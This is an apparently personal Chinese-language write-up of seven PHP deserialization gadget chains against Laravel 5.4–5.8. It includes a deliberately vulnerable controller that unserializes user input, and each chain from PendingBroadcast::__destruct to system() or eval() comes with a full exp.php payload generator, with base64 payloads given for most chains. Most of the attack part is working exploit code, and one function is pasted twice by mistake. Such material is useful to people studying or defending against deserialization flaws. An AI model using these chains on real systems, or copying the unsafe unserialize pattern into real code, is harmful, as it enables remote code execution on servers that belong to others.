laravel5.4反序列化
--------------

适用于5.4~5.8

好的RCE的格式
--------

```php
#
return $this->customCreators[$driver]($this->app);
#
return call_user_func_array($callback, $parameters);
#
$response = $listener($event, $payload); //system支持两个参数
#
while (!call_user_func($this->validator, $res));
```

好的入口格式
------

```php
#
$this->events->dispatch($this->event);
#
$this->parent->addCollection($this->collection);
#
$this->events->dispatch()($this->event);
#
```

**审计要深入每个函数，包括类中的函数**

技巧
--

```php
$res = call_user_func_array(array($this->generator, $name), $arguments);
//可以使用__call返回，控制$res
```

环境搭建
----

```sh
composer create-project --prefer-dist laravel/laravel laravel5.4 "5.4.*"
#下载的版本应该是 5.4.30的。
```

添加路由(routes/web.php)

```php
Route::get('/index',"testController@test");
```

添加控制器(Http/Controllers/testController.php)

```php
<?php
namespace App\Http\Controllers;
use Illuminate\Http\Request;
class testController{
    public function test(Request $request){
        $payload=$request->input("cmd");
        unserialize(base64_decode($payload));
        return 'hello binbin';
    }
}
```

链子1
---

**寻找入口函数**

**全局搜索 `__destruct()` 方法或者 `__wakeup()` 方法**

找到了三个（使用方法类似）

```php
//Illuminate\Broadcasting\PendingBroadcast.php 
public function __destruct()
{
    $this->events->dispatch($this->event);
}

//Loader/Configurator/ImportConfigurator.php
public function __destruct()
{
    $this->parent->addCollection($this->route);
}

//Loader/Configurator/CollectionConfigurator.php
public function __destruct()
{
    $this->collection->addPrefix(rtrim($this->route->getPath(), '/'));
    $this->parent->addCollection($this->collection);
}
```

利用思路：**找 `__call`、找可利用的 `dispatch` 方法**

**寻找可用的\_\_call方法**

```php
//Illuminate/Support/Manager.php
public function __call($method, $parameters)
{
    return $this->driver()->$method(...$parameters);
}
```

**跟进driver**()

```php
public function driver($driver = null)
    {
        $driver = $driver ?: $this->getDefaultDriver();

        // If the given driver has not been created before, we will create the instances
        // here and cache it so we can return it next time very quickly. If there is
        // already a driver created by this name, we'll just return that instance.
        if (! isset($this->drivers[$driver])) {
            $this->drivers[$driver] = $this->createDriver($driver);
        }

        return $this->drivers[$driver];
    }
```

**跟进createDriver**

```php
    protected function createDriver($driver)
    {
        // We'll check to see if a creator method exists for the given driver. If not we
        // will check for a custom driver creator, which allows developers to create
        // drivers using their own customized driver creator Closure to create it.
        if (isset($this->customCreators[$driver])) {
            return $this->callCustomCreator($driver);
        } else {
            $method = 'create'.Str::studly($driver).'Driver';

            if (method_exists($this, $method)) {
                return $this->$method();
            }
        }
        throw new InvalidArgumentException("Driver [$driver] not supported.");
    }
```

**跟进callCustomCreator**

```php
    protected function callCustomCreator($driver)
    {
        return $this->customCreators[$driver]($this->app);
        //$this->customCreators,$this->app可控，可以进行RCE
    }
```

之后就是要确认$driver的值是否可控

**回到driver()，跟进getDefaultDriver**

看到getDefaultDriver是Manager.php的一个抽象类，寻找实现了此方法的类

```php
//Illuminate/Notifications/ChannelManager.php
public function getDefaultDriver()
{
    return $this->defaultChannel;
}
```

因此就完全可以RCE了

**exp.php**

```php
<?php
namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Notifications{
    class ChannelManager {
        //子类可以设置、使用父类的属性和函数
        protected $defaultChannel; //参数类型限制与原类一样
        protected $customCreators;
        protected $app;

        public function __construct($defaultChannel, $customCreators,$app)
        {
            $this->defaultChannel = $defaultChannel;
            $this->customCreators = $customCreators;
            $this->app = $app;
        }
    }
}
namespace {

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Notifications\ChannelManager;

    $channelManager=new ChannelManager('binbin',array('binbin'=>'system'),'whoami');
    $pendingBroadcast=new PendingBroadcast($channelManager,'binbin');
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}

```

payload

```text
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czoxNzoiACoAZGVmYXVsdENoYW5uZWwiO3M6NjoiYmluYmluIjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjY6ImJpbmJpbiI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAGFwcCI7czo2OiJ3aG9hbWkiO31zOjg6IgAqAGV2ZW50IjtzOjY6ImJpbmJpbiI7fQ%3D%3D
```

链子2(需要绕过**wakeup,低版本没有**wakeup)
-------------------------------

**利用链子1的入口函数**

```php
//Illuminate\Broadcasting\PendingBroadcast.php 
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找\_\_call函数**

```php
//Faker/Generator.php
    public function __call($method, $attributes)
    { //$method=>dispatch $attributes=>$this->event
        return $this->format($method, $attributes);
    }
```

**跟进format**

```php
//Faker/Generator.php
public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }
```

**跟进getFormatter**

```php
public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);

                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
```

一切都进行得很好结果发现了

```php
public function __wakeup()
    {
        $this->formatters = [];
    }
```

寄了

**exp.php(没有\_\_wakeup可用)**

```php
<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Faker {
    class Generator
    {
        protected $formatters;

        public function __construct($formatters)
        {
            $this->formatters = $formatters;
        }
    }
}

namespace {
    use Faker\Generator;
    use Illuminate\Broadcasting\PendingBroadcast;

    $generator = new Generator(array('dispatch'=>'system'));
    $pendingBroadcast = new PendingBroadcast($generator, 'whoami');
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}
```

链子3
---

**还是使用链子1的入口**

```php
//Illuminate\Broadcasting\PendingBroadcast.php 
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找\_\_call方法**

```php
//Illuminate/Validation/Validator.php
public function __call($method, $parameters)
    {
        $rule = Str::snake(substr($method, 8));//$rule=''
        if (isset($this->extensions[$rule])) {
            return $this->callExtension($rule, $parameters);
        }

        throw new BadMethodCallException("Method [$method] does not exist.");
    }
```

**跟进callExtension**

```php
protected function callExtension($rule, $parameters)
    {
        $callback = $this->extensions[$rule];
        if (is_callable($callback)) {
            return call_user_func_array($callback, $parameters);
            //可能存在RCE
        } elseif (is_string($callback)) {
            return $this->callClassBasedExtension($callback, $parameters);
        }
    }
```

如果可以控制$callback,就可以RCE

**$callback可控**

跟进\_\_call方法中的Str::snake

```php
//substr('dispatch', 8)=='',所以$value==''
public static function snake($value, $delimiter = '_')
    {
        $key = $value;

        if (isset(static::$snakeCache[$key][$delimiter])) {
            return static::$snakeCache[$key][$delimiter];
        }

        if (! ctype_lower($value)) {
            $value = preg_replace('/\s+/u', '', $value);

            $value = static::lower(preg_replace('/(.)(?=[A-Z])/u', '$1'.$delimiter, $value));
        }

        return static::$snakeCache[$key][$delimiter] = $value;
    //返回值为''
    }
```

所以

```php
$rule = Str::snake(substr($method, 8));//$rule=''
```

exp.php

```php
<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Validation {
    class Validator
    {
        public $extensions;
        public function __construct($extensions)
        {
            $this->extensions = $extensions;
        }
    }
}

namespace {

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Validation\Validator;

    $validator=new Validator(array(''=>'system'));
    $pendingBroadcast=new PendingBroadcast($validator,'whoami');
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}
```

payload

```text
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9
```

链子4
---

**使用链子1的入口**

```php
//Illuminate\Broadcasting\PendingBroadcast.php 
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找 `dispatch` 方法**

```php
public function dispatch($event, $payload = [], $halt = false)
    {
        // When the given "event" is actually an object we will assume it is an event
        // object and use the class as the event name and this event itself as the
        // payload to the handler, which makes object based events quite simple.
        list($event, $payload) = $this->parseEventAndPayload(
            $event, $payload
        );

        if ($this->shouldBroadcast($payload)) {
            $this->broadcastEvent($payload[0]);
        }

        $responses = [];

        foreach ($this->getListeners($event) as $listener) {
            $response = $listener($event, $payload);
            //可以进行RCE，system支持两个参数
            // If a response is returned from the listener and event halting is enabled
            // we will just return this response, and not call the rest of the event
            // listeners. Otherwise we will add the response on the response list.
            if ($halt && ! is_null($response)) {
                return $response;
            }

            // If a boolean false is returned from a listener, we will stop propagating
            // the event to any further listeners down in the chain, else we keep on
            // looping through the listeners and firing every one in our sequence.
            if ($response === false) {
                break;
            }
            $responses[] = $response;
        }
        return $halt ? null : $responses;
    }
```

**跟进getListeners**

```php
public function getListeners($eventName)
    {
        $listeners = isset($this->listeners[$eventName]) ? $this->listeners[$eventName] : [];
    //返回$this->listeners[$eventName],$listeners有空
        $listeners = array_merge(
            $listeners, $this->getWildcardListeners($eventName)
        );

        return class_exists($eventName, false)
                    ? $this->addInterfaceListeners($eventName, $listeners)
                    : $listeners;
    //最后返回$listeners
    }
```

**exp.php**

```php
<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}
namespace Illuminate\Events {

    class Dispatcher
    {
        protected $listeners;
        public function __construct($listeners){
            $this->listeners=$listeners;
        }
    }
}

namespace {

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Events\Dispatcher;

    $event='whoami';
    $dispatcher=new Dispatcher(array($event=>['system']));
    $pendingBroadcast=new PendingBroadcast($dispatcher,$event);
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}

```

payload

```php
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjY6Indob2FtaSI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9
```

链子5(适用版本多)
----------

**使用链1的入口**

```php
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找dispatch方法**

```php
//src/Illuminate/Bus/Dispatcher.php
public function dispatch($command)
    {//$this->queueResolver==true;$command instanceof ShouldQueue
        if ($this->queueResolver && $this->commandShouldBeQueued($command)) 
        {
            return $this->dispatchToQueue($command);
        } else {
            return $this->dispatchNow($command);
        }
    }
```

**跟进commandShouldBeQueued**

```php
protected function commandShouldBeQueued($command)
    {
        return $command instanceof ShouldQueue;
    //（1）判断一个对象是否是某个类的实例，（2）判断一个对象是否实现了某个接口。
    }
```

**跟进dispatchToQueue**

```php
public function dispatchToQueue($command)
    {
        //$command可以是任意一个ShouldQueued的对象或者实现了此接口的对象，只要设置connection就好了
        $connection = isset($command->connection) ? $command->connection : null;

        $queue = call_user_func($this->queueResolver, $connection);

        if (! $queue instanceof Queue) {
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        }

        if (method_exists($command, 'queue')) {
            return $command->queue($queue, $command);
        } else {
            return $this->pushCommandToQueue($queue, $command);
        }
    }public function dispatchToQueue($command)
    {
        $connection = isset($command->connection) ? $command->connection : null;

        $queue = call_user_func($this->queueResolver, $connection);

        if (! $queue instanceof Queue) {
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        }

        if (method_exists($command, 'queue')) {
            return $command->queue($queue, $command);
        } else {
            return $this->pushCommandToQueue($queue, $command);
        }
    }
```

**exp.php**

```php
<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Bus {
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}

namespace Illuminate\Foundation\Console {
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}

namespace {

    use Illuminate\Broadcasting\PendingBroadcast;
    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    $event='whoami';
    $queuedCommand=new QueuedCommand($event);
    $dispatcher=new Dispatcher('system');
    $pendingBroadcast=new PendingBroadcast($dispatcher,$queuedCommand);
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}

```

paylaod

```test
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7Tzo0MzoiSWxsdW1pbmF0ZVxGb3VuZGF0aW9uXENvbnNvbGVcUXVldWVkQ29tbWFuZCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo2OiJ3aG9hbWkiO319
```

链子6
---

**入口**

```php
//Illuminate\Broadcasting\PendingBroadcast.php 
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找\_\_call方法**

```php
//src/Faker/ValidGenerator.php
public function __call($name, $arguments)
    {
        $i = 0;
        do {
            $res = call_user_func_array(array($this->generator, $name), $arguments);//可以使用__call返回，控制$res
            $i++;
            if ($i > $this->maxRetries) {
                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this->maxRetries));
            }
        } while (!call_user_func($this->validator, $res));

        return $res;
    }
```

**可以使用\_\_call返回，控制$res**

```php
    //src/Faker/DefaultGenerator.php
public function __call($method, $attributes)
    {
        return $this->default;
    }
```

**exp.php**

```php
<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default)
        {
            $this->default = $default;
        }

    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $validator, $maxRetries)
        {
            $this->generator = $generator;
            $this->validator = $validator;
            $this->maxRetries = $maxRetries;
        }

    }
}

namespace {

    use Faker\DefaultGenerator;
    use Faker\ValidGenerator;
    use Illuminate\Broadcasting\PendingBroadcast;
    $defaultGenerator=new DefaultGenerator('whoami');
    $validGenerator=new ValidGenerator($defaultGenerator,'system',1);
    $pendingBroadcast = new PendingBroadcast($validGenerator, 'whoami');
    echo urlencode(base64_encode(serialize($pendingBroadcast)));
}
```

payload

```text
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6Njoid2hvYW1pIjt9czoxMjoiACoAdmFsaWRhdG9yIjtzOjY6InN5c3RlbSI7czoxMzoiACoAbWF4UmV0cmllcyI7aToxO31zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ%3D%3D
```

链子7
---

在链子5的基础上进行(感觉比较鸡肋)

**使用链1的入口**

```php
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

**寻找dispatch方法**

```php
//src/Illuminate/Bus/Dispatcher.php
public function dispatch($command)
    {//$this->queueResolver==true;$command instanceof ShouldQueue
        if ($this->queueResolver && $this->commandShouldBeQueued($command)) 
        {
            return $this->dispatchToQueue($command);
        } else {
            return $this->dispatchNow($command);
        }
    }
```

**跟进commandShouldBeQueued**

```php
protected function commandShouldBeQueued($command)
    {
        return $command instanceof ShouldQueue;
    //（1）判断一个对象是否是某个类的实例，（2）判断一个对象是否实现了某个接口。
    }
```

**跟进dispatchToQueue**

```php
public function dispatchToQueue($command)
    {
        //$command可以是任意一个ShouldQueued的对象或者实现了此接口的对象，只要设置connection就好了
        $connection = isset($command->connection) ? $command->connection : null;

        $queue = call_user_func($this->queueResolver, $connection);

        if (! $queue instanceof Queue) {
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        }

        if (method_exists($command, 'queue')) {
            return $command->queue($queue, $command);
        } else {
            return $this->pushCommandToQueue($queue, $command);
        }
    }public function dispatchToQueue($command)
    {
        $connection = isset($command->connection) ? $command->connection : null;

        $queue = call_user_func($this->queueResolver, $connection);
    //传入数组[A,func],调用A类的func方法，$connection作为参数
        if (! $queue instanceof Queue) {
            throw new RuntimeException('Queue resolver did not return a Queue implementation.');
        }

        if (method_exists($command, 'queue')) {
            return $command->queue($queue, $command);
        } else {
            return $this->pushCommandToQueue($queue, $command);
        }
    }
```

**寻找危险函数 eval()**

```php
//Mockery\Loader\EvalLoader.php
class EvalLoader implements Loader
{
    public function load(MockDefinition $definition)
    {
        if (class_exists($definition->getClassName(), false)) {
        //class_exists():检测是否存在改该类名   
            return;
        }

        eval("?>" . $definition->getCode());  //eval危险函数，只要能控制$definition->getClassName()和$definition->getCode()就可以执行命令了
    }
}

```

**跟踪getcode()和getclassname()**

```php
<?php
namespace Mockery\Generator;
class MockDefinition
{
    protected $config;
    protected $code;

public function getClassName()
    {
        return $this->config->getName();
    }

    public function getCode()
    {
        return $this->code;
    }
}

```

getcode()可以直接控制

**跟进getname()**

位于line.php

```php
<?php declare(strict_types=1);

namespace PhpParser\Node\Scalar\MagicConst;

use PhpParser\Node\Scalar\MagicConst;

class Line extends MagicConst
{
    public function getName() : string {
        return '__LINE__';
    }

    public function getType() : string {
        return 'Scalar_MagicConst_Line';
    }
}

```

因为不存在`__LINE__`的类名，可以直接利用

**exp.php**

```php
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();

        }
    }
}
namespace Illuminate\Foundation\Console{
    use Mockery\Generator\MockDefinition;
    class QueuedCommand
    {
        public $connection;
        public function __construct()
        {
            $this->connection=new MockDefinition();
        }
    }
}

namespace Mockery\Generator{

    class MockDefinition{
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php echo system('whoami'); exit(); ?>";
            $this->config=new MockConfiguration();
        }
    }
    class MockConfiguration{

    }
}

namespace Illuminate\Bus{
    use Mockery\Loader\EvalLoader;
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct()
        {
            $this->queueResolver=[new EvalLoader(),'load'];
            //$this->queueResolver=array(new EvalLoader(),'load'); 
            //数组
        }

    }
}

namespace Mockery\Loader{
    class EvalLoader{

    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}

```